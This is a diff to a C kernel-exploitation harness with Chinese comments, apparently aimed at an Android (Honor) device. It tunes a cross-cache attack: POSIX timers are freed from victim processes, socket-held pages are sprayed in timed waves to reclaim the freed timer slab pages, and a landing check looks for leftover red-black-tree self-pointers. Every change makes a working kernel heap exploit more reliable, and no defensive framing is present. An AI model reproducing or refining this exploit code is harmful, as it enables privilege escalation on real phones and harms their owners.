@@ -94,6 +94,86 @@ static void pin_cpu(int c)
     sched_setaffinity(0, sizeof s, &s);
 }
 
+/* ------------------------------------------------------------------ *
+ * 提速开关（环境变量，默认值即“提速”档）：
+ *   T64560_PCP=1      deleter 与 spray 绑同一颗核：被释放的页直接落在该核的
+ *                     pcp 链上，下一次分配原地拿回，不必等几秒排空。
+ *   T64560_FLOOR_MS=  每轮最早开始喷洒的时间（默认 600ms）。
+ *                     旧代码把这一步写死成 min_drain=4500ms。
+ *   T64560_WAVE_MS=   分波喷洒间隔（默认 200ms，0 = 不分波）。
+ *   T64560_POLL_MS=   排空轮询间隔（默认 20ms）。
+ * ------------------------------------------------------------------ */
+static int g_pcp;
+
+static int read_posix_slab(int *active, int *total);
+
+/* 可选调参文件：一行一个 KEY=VALUE，只在环境变量没设时生效。
+ * 用来在不重新打包的前提下回退到旧时序（T64560_FLOOR_MS=4500, T64560_WAVE_MS=0）。 */
+static void load_cfg(const char *path)
+{
+    FILE *f = fopen(path, "re");
+    char line[160];
+
+    if (!f)
+        return;
+    while (fgets(line, sizeof line, f)) {
+        char *eq = strchr(line, '=');
+        if (!eq)
+            continue;
+        *eq = 0;
+        char *k = line;
+        char *v = eq + 1;
+        while (*k == ' ' || *k == '\t') k++;
+        char *ke = k + strlen(k);
+        while (ke > k && (ke[-1] == ' ' || ke[-1] == '\t')) *--ke = 0;
+        char *ve = v + strlen(v);
+        while (ve > v && (ve[-1] == '\n' || ve[-1] == '\r' || ve[-1] == ' ')) *--ve = 0;
+        if (*k && getenv(k) == NULL)
+            setenv(k, v, 1);
+    }
+    fclose(f);
+}
+
+
+static const char *honor_work_dir(void)
+{
+    const char *dir = getenv("HONOR_WORK");
+    return dir && *dir ? dir : "/data/local/tmp/honor";
+}
+
+static void honor_work_path(char *out, size_t size, const char *name)
+{
+    snprintf(out, size, "%s/%s", honor_work_dir(), name);
+}
+
+static int env_ms(const char *name, int fallback)
+{
+    const char *s = getenv(name);
+
+    if (!s || !*s)
+        return fallback;
+    int v = atoi(s);
+    return v < 0 ? fallback : v;
+}
+
+/* 等 posix_timers_cache 回到 want 水平。返回耗时（ms）；超时返回 -1。
+ * 返回值 >= 0 说明本轮基线是干净的，可以用小的 floor_ms。 */
+static long long settle_slab(int want_a, int want_t, int max_ms)
+{
+    long long t0 = now_ms();
+    int act, tot;
+
+    for (;;) {
+        if (read_posix_slab(&act, &tot) == 0 &&
+            (want_a <= 0 || (act <= want_a + DRAIN_SLACK &&
+                             tot <= want_t + DRAIN_SLACK)))
+            return now_ms() - t0;
+        if (now_ms() - t0 >= max_ms)
+            return -1;
+        usleep(50000);
+    }
+}
+
 static int read_posix_slab(int *active, int *total)
 {
     FILE *f = fopen("/proc/slabinfo", "re");
@@ -190,7 +270,7 @@ static void *delete_worker(void *arg)
 {
     struct deljob *j = arg;
 
-    pin_cpu(2 + j->widx);
+    pin_cpu(g_pcp ? 0 : 2 + j->widx);
     while (!g_go_all[j->victim]) ;
     for (int i = j->widx; i < j->n; i += j->wcount)
         if (syscall(SYS_timer_delete, j->ids[i]) == 0)
@@ -249,17 +329,28 @@ int main(int argc, char **argv)
 
     if (nv > MAXVICTIM) nv = MAXVICTIM;
     if (nfrag > MAXFRAG) nfrag = MAXFRAG;
-    g_ring_cap = nfrag + 512;
 
     signal(SIGUSR1, SIG_IGN);
     signal(SIGCHLD, SIG_IGN);
     pin_cpu(0);
 
     struct rlimit rl;
-    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
-        rl.rlim_cur = rl.rlim_max;
-        setrlimit(RLIMIT_NOFILE, &rl);
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        if (rl.rlim_cur < rl.rlim_max) {
+            rl.rlim_cur = rl.rlim_max;
+            setrlimit(RLIMIT_NOFILE, &rl);
+        }
     }
+    /* 每个持有页的 socket 要占一个 fd：把 nfrag 夹进 fd 上限，
+     * 否则喷洒预算永远也花不完（每多喷一批都 EMFILE 返回 0）。 */
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 128) {
+        long fd_cap = (long)rl.rlim_cur - 64;
+        if (nfrag > fd_cap)
+            nfrag = (int)fd_cap;
+        if (nfrag < 256)
+            nfrag = 256;
+    }
+    g_ring_cap = nfrag + 512;
 
     char *shm = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (shm == MAP_FAILED) return 1;
@@ -275,15 +366,45 @@ int main(int argc, char **argv)
     fflush(stdout);
 
     int base_a = -1, base_t = -1;
-    read_posix_slab(&base_a, &base_t);
-    printf("v36 timers=%d victims=%d frag=%d drain_max=%dms baseline=%d/%d\n",
-           ntimer, nv, nfrag, drain_ms, base_a, base_t);
+    char cfg_path[512];
+    honor_work_path(cfg_path, sizeof(cfg_path), "speed.cfg");
+    load_cfg(cfg_path);
+    load_cfg("/data/local/tmp/speed.cfg");
+    int base_ok = read_posix_slab(&base_a, &base_t) == 0;
+    g_pcp = env_ms("T64560_PCP", 0) > 0;
+    int floor_ms = env_ms("T64560_FLOOR_MS", 600);
+    int wave_ms  = env_ms("T64560_WAVE_MS", 200);
+    int poll_ms  = env_ms("T64560_POLL_MS", 20);
+    if (poll_ms < 1) poll_ms = 1;
+    int batch = nfrag / 8;
+    if (batch < 200) batch = 200;
+    printf("v36 timers=%d victims=%d frag=%d drain_max=%dms baseline=%d/%d "
+           "slabinfo=%s floor=%dms wave=%dms batch=%d pcp=%d\n",
+           ntimer, nv, nfrag, drain_ms, base_a, base_t,
+           base_ok ? "yes" : "no", floor_ms, wave_ms, batch, g_pcp);
     fflush(stdout);
+
+    int floor_eff = min_drain;
 
     for (int a = 1; a <= attempts; a++) {
         pid_t vpid[MAXVICTIM];
         int *ids[MAXVICTIM];
         int total_all = 0;
+        long long at0 = now_ms();
+
+        /* 先把上一轮的残留等回空闲水平，并把基线刷新成「本轮真实起点」。
+         * 旧代码只在循环外读一次基线，所以才被迫用 4.5s 的固定下限兜底。 */
+        long long settle_ms = base_ok ? settle_slab(base_a, base_t, drain_ms) : 0;
+        if (settle_ms >= 0) {
+            int na = -1, nt = -1;
+            if (read_posix_slab(&na, &nt) == 0) {
+                base_a = na;
+                base_t = nt;
+            }
+        }
+        /* slabinfo 读不到时没有可用的排空判据，直接走分波喷洒；
+         * 用 min_drain 只会白等。 */
+        floor_eff = (!base_ok || settle_ms >= 0) ? floor_ms : min_drain;
 
         for (int i = 0; i < MAXVICTIM; i++) { vpid[i] = -1; ids[i] = NULL; }
         for (int j = 0; j < nv; j++) { g_go_all[j] = 0; g_del[j] = 0; }
@@ -322,30 +443,47 @@ int main(int argc, char **argv)
             for (int i = 0; i < nworker; i++) pthread_join(th[i], NULL);
         }
 
-        /* 等 posix_timers_cache 排空 */
+        /* 排空 + 分波喷洒。
+         *  - slabinfo 读得到时：strict 门一满足就立刻喷（和旧逻辑等价，但门槛低）；
+         *  - 读不到时（Android 上 /proc/slabinfo 通常只给 root）：从 floor_eff
+         *    起每 wave_ms 喷一批，后一批自然接住刚回到 buddy 的计时器页，
+         *    不再白等满 drain_ms。
+         * 喷洒预算用完就收工 —— 那时这一轮的结果已经定了。 */
         long long t0 = now_ms();
         int drained = 0, act = -1, tot = -1, loose = 0;
-        while (now_ms() - t0 < drain_ms) {
-            if (read_posix_slab(&act, &tot) == 0) {
-                int strict_ok = base_a > 0 && act <= base_a + DRAIN_SLACK &&
-                                tot <= base_t + DRAIN_SLACK &&
-                                now_ms() - t0 >= min_drain;
+        int waves = 0, got = 0, stall = 0;
+        int ring_before = g_ring_n;
+
+        for (;;) {
+            long long el = now_ms() - t0;
+            if (el >= drain_ms || got >= nfrag || stall >= 2) break;
+            if (base_ok && read_posix_slab(&act, &tot) == 0) {
+                int strict_ok = act <= base_a + DRAIN_SLACK &&
+                                tot <= base_t + DRAIN_SLACK && el >= floor_eff;
                 int loose_ok  = act > 0 && act < 1200 && tot < 1200;
                 if (strict_ok) { drained = 1; break; }
                 if (loose_ok) loose = 1;
-                if (loose && now_ms() - t0 >= 8000) { drained = 2; break; }
+                if (loose && el >= 8000) { drained = 2; break; }
             }
-            usleep(100000);
+            if (wave_ms > 0 && el >= floor_eff + (long long)waves * wave_ms &&
+                got + batch <= nfrag) {
+                int added = frag_spray(batch, fbuf);
+                /* 喷洒不动了（fd 用尽/内存失败）：再加波也只是空转 */
+                if (added <= 0) stall++;
+                else stall = 0;
+                got += added;
+                waves++;
+            }
+            usleep((useconds_t)poll_ms * 1000);
         }
         long long drained_ms = now_ms() - t0;
-
-        int ring_before = g_ring_n;
-        int got = drained ? frag_spray(nfrag, fbuf) : 0;
+        if (got < nfrag)
+            got += frag_spray(nfrag - got, fbuf);
 
         for (int j = 0; j < nv; j++) {
             if (vpid[j] > 0) { kill(vpid[j], SIGKILL); }
         }
-        usleep(300000);
+        usleep(20000);          /* 收尸/回落交给下一轮 settle，不再固定 300ms */
         for (int j = 0; j < nv; j++) { free(ids[j]); }
 
         /* 落地判据（收紧版）：RB_CLEAR_NODE 把「节点自身地址」写回节点首 8 字节，
@@ -372,8 +510,10 @@ int main(int argc, char **argv)
 
         frag_trim_all();
 
-        printf("attempt=%d victims=%d timers=%d drained=%d(%lldms) slab=%d/%d frag=%d landed=%d\n",
-               a, nv, total_all, drained, drained_ms, act, tot, got, landed);
+        printf("attempt=%d victims=%d timers=%d settle=%lld drained=%d(%lldms) "
+               "slab=%d/%d frag=%d waves=%d landed=%d elapsed=%lldms\n",
+               a, nv, total_all, settle_ms, drained, drained_ms,
+               act, tot, got, waves, landed, now_ms() - at0);
         fflush(stdout);
 
         if (landed) {
